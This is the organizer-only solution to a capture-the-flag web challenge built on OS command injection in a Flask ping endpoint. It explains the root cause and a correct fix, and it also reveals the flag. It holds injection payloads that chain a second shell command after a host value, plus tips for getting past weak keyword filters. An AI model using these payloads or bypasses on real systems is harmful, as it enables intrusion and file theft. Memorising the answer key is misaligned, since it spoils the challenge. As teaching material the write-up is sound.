---
title: ping-utility
category: web
difficulty: beginner
points: 100-500
author: h1tl4r
date: 2026-11-07
---
# solution — ping-utility (organizer only)

**Flag:** `ingehack{s3m1c0l0ns_ch41n_c0mm4nds}`

## Vulnerability

OS command injection in `POST /ping`. The `host` field is concatenated into a
string executed by `/bin/sh`, so the player can append a second command with
`;`, `&&`, `|` or `$(...)` and read `/flag.txt`.

This is the only vulnerability in the app. Output is rendered in an
auto-escaped template, there is no debug or file route, and `/flag.txt` is not
served statically.

## Root cause

`POST /ping` builds its command like this (`src/app.py`):

```python
host = request.form.get("host", "").strip()

# VULN: user input is concatenated into a shell command string and run
# with shell=True, so `;`, `&&`, `|` or `$(...)` start new commands.
result = subprocess.run(
    "ping -c 2 " + host,
    shell=True,
    capture_output=True,
    text=True,
    timeout=10,
)
```

With `shell=True`, Python runs `/bin/sh -c "ping -c 2 <host>"`. The shell
parses the whole string after the app has built it, so characters that mean
something to a shell are interpreted as shell syntax. The app wanted a
hostname; the shell sees a command line. `host` is not quoted or escaped, and
quoting would not be a safe fix for a shell string.

The returned `stdout` and `stderr` are shown on the page, so anything the
injected command prints comes back to the player.

## Chaining operators (teaching notes)

| Operator | Meaning |
|----------|---------|
| `;` | Run the next command unconditionally. |
| `&&` | Run the next command only if the previous one succeeded. |
| `\|\|` | Run the next command only if the previous one failed. |
| `\|` | Pipe the previous command's output into the next command. |
| `$(cmd)` / `` `cmd` `` | Command substitution: run `cmd` and insert its output. |
| `&` | Run the previous command in the background, then continue. |

## Exact payload

```
127.0.0.1; cat /flag.txt
```

The shell sees `ping -c 2 127.0.0.1` followed by `cat /flag.txt`. Ping may
succeed or fail; the semicolon does not care, and `cat` runs either way. The
output box shows the ping output followed by:

```
ingehack{s3m1c0l0ns_ch41n_c0mm4nds}
```

Any equivalent works, for example:

```
127.0.0.1 && cat /flag.txt
127.0.0.1 | cat /flag.txt
127.0.0.1; head -n 1 /flag.txt
$(cat /flag.txt)
```

### No filter was added

The challenge uses no blacklist. The lesson is the shell chaining itself, and
a weak string filter (`cat`, `flag`) is trivial to bypass with `tac`, `head`,
`more`, `${IFS}`, or globs such as `/fl*`. Adding one would only add a second,
shallow step for a Medium challenge. If you extend it, a filter must never be
presented as a fix: the fix is to stop using a shell.

## Automated check

From the challenge folder, with the container running on host port 8004:

```bash
python3 solution/solve.py http://localhost:8004
```

It verifies a normal ping does not leak the flag, sends the payload, and prints
only the flag found in the output HTML.

## Flag file and runtime design

The container runs as root. `/flag.txt` is a root-owned symlink baked into
the image pointing at `/tmp/flag.txt`:

- local compose uses a read-only root filesystem plus a writable `/tmp` tmpfs;
- `src/entrypoint.sh` runs as root, writes `FLAG` (or the non-secret
  placeholder `ingehack{undeployed}`) to `/tmp/flag.txt` with mode `0444`,
  **unsets `FLAG`**, then `exec`s gunicorn;
- `ops/deploy-static.sh` injects only `-e FLAG=...`; the same entrypoint works
  there, and the app process environment does not contain the flag.

The app user can read the flag through the symlink (`cat /flag.txt`), but the
value is not in gunicorn's environment, so a plain `env` injection does not
trivially reveal it.

## Ping and capabilities

`iputils-ping` is installed, but the local compose drops **all**
capabilities. Modern `ping` tries unprivileged ICMP datagram sockets, which do
not need `CAP_NET_RAW`; on hosts where that is disabled, ping prints a
permission error and the `;` still runs the chained command. The challenge
still works either way.

## Fix

Never build a shell string from user input. Pass the program and its arguments
as a list, so no shell is involved:

```python
import ipaddress
import re
import subprocess

from flask import Flask, render_template, request

app = Flask(__name__)

HOSTNAME_RE = re.compile(
    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*$"
)


def is_valid_host(host: str) -> bool:
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return bool(HOSTNAME_RE.match(host))


@app.post("/ping")
def ping():
    host = request.form.get("host", "").strip()
    if not is_valid_host(host):
        return render_template("index.html", host=host, output="Invalid host."), 400

    # Safe: no shell, and the input is a validated hostname/IP anyway.
    result = subprocess.run(
        ["ping", "-c", "2", host],
        capture_output=True,
        text=True,
        timeout=10,
    )
    output = (result.stdout or "") + (result.stderr or "")
    return render_template("index.html", host=host, output=output)
```

Why this works:

- `shell=False` (the default with a list) means `; cat /flag.txt` is passed to
  `ping` as a literal argument, not parsed by a shell.
- Validation with `ipaddress.ip_address` / a hostname regex rejects
  metacharacters before the argument reaches the process.
- Keep the timeout, avoid printing secrets, and run as a non-root user with all
  capabilities dropped. Least privilege limits the blast radius of a future bug
  but is **not** a substitute for the fix above.
